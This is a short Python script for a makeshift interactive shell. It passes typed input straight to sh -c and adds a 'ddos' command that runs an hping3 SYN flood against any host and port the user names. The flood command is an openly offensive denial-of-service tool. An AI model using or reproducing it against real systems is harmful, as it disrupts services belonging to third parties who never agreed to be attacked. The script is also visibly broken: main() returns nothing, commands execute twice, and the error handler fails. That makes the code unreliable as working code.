from sh import sh
from sh import ErrorReturnCode
from sh import Command as Cmd
from sh import ifconfig
from sh import hping3
from multiprocessing import Process

command_=""

def main():
    global command_
    try:
        # input from keyboard to command_ string, print the ask text ' R<--- ' in Green, Brown if command_ is empty
        if command_ == "":
            print("\033[92mR\033[0m\033[33m<---\033[0m ", end="")
        else:
            #display the text ' R<--- ' in Green, Brown and add an text '?' in Red
            print("\033[92mR\033[0m\033[33m<---\033[0m \033[91m?\033[0m ", end="")
        command_ = input()
        # if command_ is empty, print the ask text ' R<--- ' in Green, Brown and return
        if command_ == "":
            print("\033[92mR\033[0m\033[33m<---\033[0m ", end="")
            return
        # if command_ is not empty, print the ask text ' R<--- ' in Green, Brown and execute the command_
        else:
            print("\033[92mR\033[0m\033[33m<---\033[0m\033[91m{}\033[0m ".format(command_), end="\n")
            sh("-c",command_)
            
        
    except EOFError as e:
        command_ = None

    if (command_):
        if command_ == "ifconfig":
            ifconfig("-a")
        elif command_.split(" ")[0] == "ddos":
            hping3("-S", "--flood", "--force-icmp", "--destport", "{}".format(command_.split(" ")[2]), command_.split(" ")[1])
        elif command_.split(" ")[0] == "exit":
            exit(0)


        else:
            print(sh("-c",command_))

while True:
    try: 
        command_= main()
    except Exception as e:
        print("{}".format("rsh: error: "+command_+" not found"))
        continue
